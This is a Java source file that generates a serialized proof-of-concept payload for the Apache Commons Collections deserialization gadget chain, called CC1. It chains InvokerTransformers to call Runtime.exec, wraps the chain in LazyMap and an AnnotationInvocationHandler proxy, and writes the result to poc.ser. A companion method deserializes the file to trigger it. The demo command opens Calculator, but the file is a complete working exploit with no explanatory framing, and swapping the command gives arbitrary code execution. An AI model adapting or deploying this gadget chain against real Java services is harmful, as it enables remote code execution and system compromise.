import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.util.Map;

public class GenCC1 {
    public static void main(String[] args) throws Exception {
        serial();
//        unserial();

    }

    public static void serial() throws Exception{
        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/Calculator.app"}),
                new ConstantTransformer(1)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map lazy = LazyMap.decorate(new HashedMap(), fakeChain);

        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructors()[0];
        declaredConstructor.setAccessible(true);
        InvocationHandler annoHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, lazy);

        Map o = (Map) Proxy.newProxyInstance(Override.class.getClassLoader(), lazy.getClass().getInterfaces(), annoHandler);
        Object o1 = declaredConstructor.newInstance(Retention.class, o);

        Field factory = lazy.getClass().getDeclaredField("factory");
        Field modifiers = factory.getClass().getDeclaredField("modifiers");
        modifiers.setAccessible(true);
        modifiers.setInt(factory,factory.getModifiers()& ~Modifier.FINAL);
        factory.setAccessible(true);
        factory.set(lazy, chainedTransformer);
//        Field iTransformers = fakeChain.getClass().getDeclaredField("iTransformers");
//        iTransformers.setAccessible(true);
//        iTransformers.set(fakeChain,transformers);

        //        序列化
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("poc.ser"));
        objectOutputStream.writeObject(o1);
    }

    public static void unserial() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("poc.ser");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }
}
